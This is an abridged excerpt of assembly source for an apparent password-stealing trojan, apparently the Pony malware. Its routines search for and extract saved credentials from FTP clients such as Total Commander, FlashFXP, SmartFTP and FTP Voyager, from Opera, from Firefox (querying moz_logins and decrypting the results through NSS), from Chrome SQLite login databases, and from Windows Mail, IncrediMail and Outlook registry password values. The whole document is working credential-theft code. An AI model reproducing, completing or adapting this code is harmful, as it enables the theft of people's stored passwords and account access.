		...
		.IF	eax
			...
			.IF	eax
				.IF	map.dwFileSize < MEM_LIMIT
					invoke	IsDuplicateFile, map.lpMem, map.dwFileSize
					.IF	!eax
...
IsDuplicateFileName proc uses ebx path
	LOCAL	map: MappedFile
...
.data
	...
	CWTCIni			db 'wcx_ftp.ini',0
	CWTCIniAppData	db '\GHISLER',0
	
	CWTCRegValue1	db 'InstallDir',0
	CWTCRegValue2	db 'FtpIniName',0

	CWTCRegPath1 	db 'Software\Ghisler\Windows Commander',0
	CWTCRegPath2 	db 'Software\Ghisler\Total Commander',0
...
CFlashFXP_RegPath1	db	'Software\FlashFXP\3',0
CFlashFXP_RegPath2	db	'Software\FlashFXP',0
CFlashFXP_RegPath3	db	'Software\FlashFXP\4',0
...
CFlashFXP_HistoryName	db	'\History.dat',0
...
.data
	...
	CSmartFTPHistMask	db	'History.dat',0
...
.data
	CTurboFTPDatMask	db	'addrbk.dat',0
...
OperaProcessWandFile proc target_stream, lpFileName
	...
	invoke	IsDuplicateFileName, lpFileName
	.IF	!eax
...
.data
	CFTPVoyagerProfileFile	db	'FTPVoyager.ftp',0
...
FTPVoyagerCommonFileScan proc stream, csidl
	...
	.IF	eax
		...
		push	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CFTPVoyagerProfileFile, ITEMHDR_ID or 0
		pop	eax
...
.data
	...
	szSQLite3Imports	db	'sqlite3.dll',0
				db	'sqlite3_open',0
				db	'sqlite3_close',0
				db	'sqlite3_prepare',0
				db	'sqlite3_step',0
				db	'sqlite3_column_bytes',0
				db	'sqlite3_column_blob',0
				db	0
				
	szSQLite3MozImports	db	'mozsqlite3.dll',0
				db	'sqlite3_open',0
				db	'sqlite3_close',0
				db	'sqlite3_prepare',0
				db	'sqlite3_step',0
	...
	sqlite3_open		dd	0
	sqlite3_close		dd	0
	sqlite3_prepare		dd	0
	sqlite3_step		dd	0
	sqlite3_column_bytes	dd	0
	sqlite3_column_blob	dd	0
	...
	szSQLiteMozillaQuery	db	'SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins',0
...
MozillaReadSQLColData proc pStmt, iCol, lpdwDataLen
	push	iCol
	push	pStmt
...
MozillaReadSQLFile proc stream, szSQLFile, szProfilePath, szAppPath
	...
	invoke	IsDuplicateFileName, szSQLFile
	.IF	eax
		ret
	.ENDIF
	...
	invoke	LoadDllImports, offset szSQLite3MozImports, offset sqlite3_open
	.IF	!eax
		invoke	LoadDllImports, offset szSQLite3Imports, offset sqlite3_open
	.ENDIF
	...
	.IF	eax
		...
		.IF	eax == SQLITE_OK
			...
			push	eax
			push	-1
			push	offset szSQLiteMozillaQuery
			push	sql_db
			...
			.IF	eax == SQLITE_OK
				.WHILE	TRUE
					...
					; host (UTF-8)
					invoke	MozillaReadSQLColData, pStmt, 0, addr dwDataLen
					.IF	eax && dwDataLen && byte ptr[eax]
						push	eax
						mov	edx, dwDataLen
						inc	edx
						...
						pop	edx
						mov	host, eax
						invoke	MoveMem, edx, host, dwDataLen
						...
						.IF	!eax
							; user
							invoke	MozillaReadSQLColData, pStmt, 1, addr dwDataLen
							invoke	MozillaNSSDecryptPassword, eax, dwDataLen
							mov	user, eax
							
							; pass
							invoke	MozillaReadSQLColData, pStmt, 2, addr dwDataLen
							invoke	MozillaNSSDecryptPassword, eax, dwDataLen
							mov	pass, eax
...
MozillaReadSignonsFile proc uses edi stream, szSignonsFile, szProfilePath, szAppPath
	...
	invoke	IsDuplicateFileName, szSignonsFile
	.IF	eax
		ret
	.ENDIF
...
.data?
	dwSQLitePageSize	dd	?
	dwSQLiteEncoding	dd	?
	dwChromeActionURL	dd	?
	dwChromePassValue	dd	?
	dwChromeUserValue	dd	?
...
; Extract one cell from 1-dim record array
...
SQLiteReadPage proc uses edi stream, target_stream, nPage, lpStatusCode, lpCallbackFunc
	...
	.IF	page_type == SQLITE_PAGE_INTERIOR
		...
		.WHILE	edi < nCells
			...
			invoke	SQLiteReadPage, stream, target_stream, left_child, lpStatusCode, lpCallbackFunc
			.IF	!eax
				invoke	MemFree, cell_offset_array
				sub	eax, eax
				ret
		...
		invoke	SQLiteReadPage, stream, target_stream, r_pointer, lpStatusCode, lpCallbackFunc
		.IF	!eax
			invoke	MemFree, cell_offset_array
			sub	eax, eax
			ret
...
SQLiteProcessCol proc uses edi column_definition, column_index
...
SQLiteProcessSQL proc uses esi edi sql
	...
	.WHILE	byte ptr[edi]
		.IF	byte ptr[edi] == ','
			mov	byte ptr[edi], 0
			invoke	SQLiteProcessCol, esi, nCol
			.IF	!eax
				ret
			.ENDIF
			mov	esi, edi
...
SQLiteProcessDataTable proc uses esi edi stream, target_stream, row_array, cell_count
	...
	mov	eax, cell_count
	.IF	(dwChromeActionURL < eax) && (dwChromePassValue < eax) && (dwChromeUserValue < eax)
		; Get cell values
		invoke	SQLiteGetRecordArrayCell, row_array, dwChromeActionURL, addr url_cell_len, addr url_cell_type, addr url_cell_data
		invoke	SQLiteGetRecordArrayCell, row_array, dwChromeUserValue, addr user_cell_len, addr user_cell_type, addr user_cell_data
		invoke	SQLiteGetRecordArrayCell, row_array, dwChromePassValue, addr pass_cell_len, addr pass_cell_type, addr pass_cell_data
...
;   sql text
; );  
SQLiteProcessSchemaTable proc stream, target_stream, row_array, cell_count
				...
				.IF	cell_type == SQLITE_DATATYPE_STR
					...
					.IF	!eax
						...
						.IF	cell_type == SQLITE_DATATYPE_INT
							...
							.IF	cell_type == SQLITE_DATATYPE_STR
								mov	dwChromeActionURL, -1
								mov	dwChromePassValue, -1
								mov	dwChromeUserValue, -1
							
								invoke	SQLiteProcessSQL, cell_data
								mov	dwStatusCode, TRUE
								
								.IF	(dwChromeActionURL != -1) && (dwChromePassValue != -1) && (dwChromeUserValue != -1)
									invoke	SQLiteReadPage, stream, target_stream, root_page, addr dwStatusCode, offset SQLiteProcessDataTable
								.ENDIF
							.ENDIF
						.ENDIF 
					.ENDIF	
	...
	.ENDIF
	ret
SQLiteProcessSchemaTable endp

ProcessSQLiteStream proc stream, target_stream
	...
	invoke	SQLiteReadPage, stream, target_stream, 1, addr dwStatusCode, offset SQLiteProcessSchemaTable
	
	ret
ProcessSQLiteStream endp

ProcessSQLiteFile proc target_stream, szSQLFileName, item_id
	LOCAL	stream: DWORD

	invoke	StreamCreate, addr stream
	invoke	StreamLoadFromFile, szSQLFileName, stream
	.IF	eax
		invoke	ProcessSQLiteStream, stream, target_stream
		.IF	!eax
...
ChromeAppDataCommonSingleFileScan proc stream, csidl, appdata_dir, config_file, item_id
	...
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, appdata_dir
		push	eax
		invoke	CommonFileScanCallback, stream, eax, config_file, item_id, offset ProcessSQLiteFile
		call	MemFree
	.ENDIF
	ret
...
ChromeCommonScan proc stream, base_appdata_dir
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_APPDATA, base_appdata_dir, offset CChromeWebData, ITEMHDR_ID or 0
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_APPDATA, base_appdata_dir, offset CChromeLoginData, ITEMHDR_ID or 0
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_LOCAL_APPDATA, base_appdata_dir, offset CChromeWebData, ITEMHDR_ID or 0
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_LOCAL_APPDATA, base_appdata_dir, offset CChromeLoginData, ITEMHDR_ID or 0
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_COMMON_APPDATA, base_appdata_dir, offset CChromeWebData, ITEMHDR_ID or 0
	invoke	ChromeAppDataCommonSingleFileScan, stream, CSIDL_COMMON_APPDATA, base_appdata_dir, offset CChromeLoginData, ITEMHDR_ID or 0
	ret
...
GrabChromePlus proc stream
	...
	.IF	eax
		mov	inst_dir, eax
		invoke	CommonFileScanCallback, stream, inst_dir, offset CChromeWebData, ITEMHDR_ID or 0, offset ProcessSQLiteFile
		invoke	CommonFileScanCallback, stream, inst_dir, offset CChromeLoginData, ITEMHDR_ID or 0, offset ProcessSQLiteFile
...
.data
	...
	CWindowsMailPasswordList	db	'<POP3_Password2',0
								db	'<SMTP_Password2',0
								db	'<IMAP_Password2',0
...
.data
	...
	CIncrediMailSMTPServer	db	'SmtpServer',0
	CIncrediMailSMTPPort	db	'SmtpPort',0
	CIncrediMailSMTPUser	db	'SmtpAccount',0
	CIncrediMailSMTPPass	db	'SmtpPassword',0
...
.data
    COutlookRegValues		db	'SMTP Email Address',0
						    db	'SMTP Server',0
						    db	'POP3 Server',0
						    db	'POP3 User Name',0
						    db	'SMTP User Name',0
						    db	'NNTP Email Address',0
						    db	'NNTP User Name',0
						    db	'NNTP Server',0
						    db	'IMAP Server',0
						    db	'IMAP User Name',0
						    db	'Email',0
						    db	'HTTP User',0
						    db	'HTTP Server URL',0
						    db	'POP3 User',0
						    db	'IMAP User',0
						    db	'HTTPMail User Name',0
						    db	'HTTPMail Server',0
						    db	'SMTP User',0
						    db	0

	COutlookBinaryValues    db	'POP3 Port',0
						    db	'SMTP Port',0
						    db	'IMAP Port',0
						    db	0

    COutlookPassValues		db	'POP3 Password2',0
						    db	'IMAP Password2',0
						    db	'NNTP Password2',0
						    db	'HTTPMail Password2',0
						    db	'SMTP Password2',0
						    db	0

    COutlookPassValues2		db	'POP3 Password',0
						    db	'IMAP Password',0
						    db	'NNTP Password',0
						    db	'HTTP Password',0
						    db	'SMTP Password',0
...
OutlookReadValues proc uses edi esi ebx stream, reg_key, base_path, do_decrypt
...
OutlookScanPasswords proc stream, reg_key, BasePath
	...
	.IF	!eax
		...
		.WHILE	TRUE
			...
			invoke	OutlookReadValues, stream, reg_key, S, 0
